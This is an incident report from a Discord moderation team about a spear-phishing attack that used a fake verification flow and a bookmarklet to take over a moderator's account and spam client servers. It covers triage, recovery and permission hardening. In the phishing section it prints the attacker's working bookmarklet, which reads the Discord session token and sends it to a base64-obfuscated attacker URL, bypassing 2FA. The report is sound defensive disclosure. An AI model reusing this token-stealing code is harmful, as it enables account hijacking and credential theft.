# 2023-05-29 Incident Report
## Summary
* One of our team member's Discord account was compromised via a spear phishing attack.
* 2FA was enabled, but the attack vector was able to bypass it.
* The attacker spammed scam messages on several of our clients' Discord servers.
* The attacker modified roles and permissions in at least one client's Discord server.
* We were able to kick the team member from all client Discord servers within about 15 minutes of the attack.
* We were able to delete the spam messages generated by the attacker almost immediately in servers where we have message delete permissions.
* We were able to identify how the attacker gained access and revoke it.

## Spear Phishing
The attacker reached out to all of our team members individually at different times making a reasonable sounding request for moderation services in their Discord server.
The attacker claimed to be from Rarible and had a vanity Discord invite for a Rarible Discord server with a significant number of members.
The attacker's Discord server required verification (as is common across crypto Discord servers) which used a Discord integration to send the user to the attacker's website.
<details>
	<summary>Third Party Connection Request Image</summary>
	<img src="../images/attacker%20third%20party%20connection%20prompt.png" alt="third party connection request" width="400"/>
</details>

Upon authorizing, the victim was sent to ⚠️❗`https://asset-vulcan.com`❗⚠️ where the victim is instructed to complete the verification process by adding a bookmarklet and then opening discord in a browser window and clicking on the bookmarklet.

<details>
	<summary>Attacker Website Instructions Image</summary>
	<img src='../images/attacker%20website%20instructions.png' alt='attacker website instructions' width='600'/>
</details>

<details>
	<summary>Bookmarklet contents (formatted for readability)</summary>

```js
javascript: ! function() {
	if ('https://discord.com' !== this.document.location.origin) {
		alert('Drag this button to your bookmark and go to discord.com to get verified.')
	} else {
		location.reload()
		var i = document.createElement('iframe')
		document.body.appendChild(i)
		var token = i.contentWindow.localStorage.token
		token = token.replaceAll(atob('Ig=='),'')
		location.href = atob('aHR0cHM6Ly9hc3NldC12dWxjYW4uY29tL2FwaS92ZXJpZnk/ZGF0PQ==') + token
	}
}()
```
</details>
As soon as the victim follows these instructions, their logged in session token will be sent to the attacker.
The attacker will then be able to utilize that session (which already has gone through 2FA) to interact with Discord as that user.

## Triage
Our team strives to have at least 2 people on duty at all times, which paid off in this case because as soon as the attacker started spamming it was immediately noticed by another team member who was on shift.
Upon seeing the spammer, the team member deleted the spam messages they could, warned users to ignore the ones they couldn't, and alerted the Serv.eth founder (Micah Zoltu) of the issue (all within a minute of the spam commencing).
Upon receiving notification of the issue, our founder immediately began revoking all roles the compromised account had in all of our client's servers that our founder had access to do so in (most of them).
After this was complete, we realized that there was still a risk that the attacker may have sent direct messages to server members and so to further mitigate potential damage, the victim's account was then kicked from all of our client's discord servers.
The whole process took just under 15 minutes from time of compromise to being kicked from all servers.

## Recovery
Upon completion of the initial triage, we alerted all of our clients of the compromise in private channels within their respective Discord servers.
We were also able to establish contact with the victim and have them revoke all of their sessions, thus removing the attacker's access.

<details>
	<summary>How to Revoke All Sessions in Discord</summary>
	<img src='../images/revokee%20attacker%20access.png' alt='how to revoke all Discord sessions' width='600'/>
</details>

We then looked through the audit logs of all client discord servers where we have permission to do so and verified that the attacker didn't do anything other than spam.
There was one client's Discord server where the attacker removed some roles from users and adjusted channel permissions which had to be undone.
After reviewing the audit log, we then reviewed our team's permissions in servers where we have access to do so and removed "Manage Roles" permission from all except our founder where appropriate so any future compromise has limited damage.

## Future Protection
While our team is quite familiar with various scams and attacks in the crypto space since we deal with it daily, this one was novel in that it was targeted specifically at moderators and it utilized a bookmarklet as a novel delivery mechanism.
Our internal policy already requires 2FA for all of our members to help limit the chances of this sort of thing occurring, but unfortunately this attack vector is able to bypass 2FA requirements.
The primary thing we will be doing internally to limit the chance of this happening again is additional training both on the specifics of this attack (bookmarklets) as well as general best practices of not doing anything that is out of the ordinary.

For our clients, we recommend reviewing all permissions and ensuring only necessary permissions are given whenever possible.
In this case, our team had "Manage Roles" permission in several servers which wasn't something that everyone needed (only one of us needs to be able to add/remove team members) and in one server this permission was leveraged to make the attack worse.
In many of our client servers we do need kick/ban permissions in order to be able to help manage spammers/scammers, but luckily the attacker didn't appear to leverage this permission during the attack.

We also will continue to strive to always have multiple people on-shift at a time to ensure we can respond quickly to situations like this, as well as making sure there is a way to quickly escalate to our founder who has additional permissions in most servers so they can kick any of our team's compromised accounts should this happen again.